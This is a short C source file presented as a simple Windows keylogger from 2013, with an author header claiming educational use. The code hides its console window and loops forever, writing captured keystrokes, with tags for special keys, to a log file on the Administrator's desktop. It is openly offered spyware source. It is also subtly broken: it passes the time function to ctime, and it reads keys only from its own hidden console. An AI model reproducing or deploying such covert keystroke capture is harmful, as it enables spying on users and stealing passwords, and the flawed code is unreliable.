/*
    Simple WINDOWS keylogger by jkrix 2013.
    User may distribute and modify source code but MUST keep this top commented section in the source code!

    Very important note:

    To be used for educational use and not for malicious tasks!
    I will NOT be held responsible for anything silly you may do with this!
*/
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#define PATH "C:/Users/Administrator/Desktop/test-log.txt" // The path to the log file

int main(){
    char capture;
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    file = fopen(PATH, "a+");
    fprintf(file, "\n#$Logger: Written by jkrix. Started logging @ %s", ctime(&time));

    while(1)
    {
        Sleep(20); // To make sure this program doesn't steal all resources.
        if (kbhit())
        {
            capture = getch();
            // Just add in some helper strings here to the file, feel free to modify these to your needs.
            switch ((int)capture){
                case ' ': // Space key...obviously.
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,file); // Put any other inputted key into the file.
            }

            if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
                fclose(file);
                return 0;
            }
        }
    }
}